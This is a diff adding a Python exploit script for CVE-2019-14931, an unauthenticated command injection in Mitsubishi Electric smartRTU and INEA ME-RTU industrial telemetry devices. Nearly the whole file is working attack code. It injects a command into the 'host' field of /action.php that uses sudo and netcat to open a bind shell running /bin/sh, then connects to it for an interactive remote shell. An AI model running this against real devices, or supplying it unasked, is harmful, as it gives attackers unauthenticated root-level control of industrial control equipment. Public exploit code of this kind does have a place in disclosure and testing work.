@@ -1,0 +1,69 @@
+#!/usr/bin/python
+
+# Exploit Title: Mitsubishi Electric smartRTU & INEA ME-RTU Unauthenticated OS Command Injection
+# Date: 29 June 2019 
+# Exploit Author: (@xerubus | mogozobo.com)
+# Vendor Homepage: https://eu3a.mitsubishielectric.com/fa/en/products/cnt/plcccl/items/smartRTU/local
+# Vendor Homepage: http://www.inea.si/en/telemetrija-in-m2m-produkti/mertu-en/
+# Firmware Version: Misubishi Electric 2.02 & INEA 3.0 
+# CVE-ID: CVE-2019-14931
+# Full write-up: https://www.mogozobo.com/?p=3593
+
+import sys, os, requests, socket
+
+os.system('clear')
+
+print("""\
+        _  _
+  ___ (~ )( ~)
+ /   \_\ \/ /   
+|   D_ ]\ \/  -= Bind_Me-smartRTU  by @xerubus =-    
+|   D _]/\ \  -= We all have something to hide =-
+ \___/ / /\ \\
+      (_ )( _)
+      @Xerubus    
+                    """)
+
+host = raw_input("Enter RTU IP address: ")
+port = raw_input("Enter bind shell port number: ")
+	
+php_page = '/action.php'
+url = "http://{}{}".format(host, php_page)
+payload = {'host' : ';sudo /usr/sbin/service ../../bin/nc -nvlp '+port+' -e /bin/sh&PingCheck=Test'}
+
+print "\n[+] Building payload"
+print "[+] Sending payload"
+print "[+] Attempting connection to smartRTU"
+
+try:
+   r = requests.post(url, data=payload, timeout=1)
+except:
+   pass
+
+port = (int(port))
+
+try:
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((host, port))
+	
+   try :  
+      print "[+] Connected to the smartRTU!\n"
+      while 1:  
+         cmd = raw_input("(smartRTU-shell) # ");  
+         s.send(cmd + "\n");  
+         result = s.recv(1024).strip();  
+         if not len(result) :  
+            print "\n[!] Play nice now skiddies....\n\n"
+            s.close();  
+            break;  
+         print(result);  
+
+   except KeyboardInterrupt:
+      print "\n[+] ^C Received, closing connection"
+      s.close();
+   except EOFError:
+      print "\n[+] ^D Received, closing connection"
+      s.close();
+
+except socket.error:
+   print "[!] Failed to connect to bind shell."
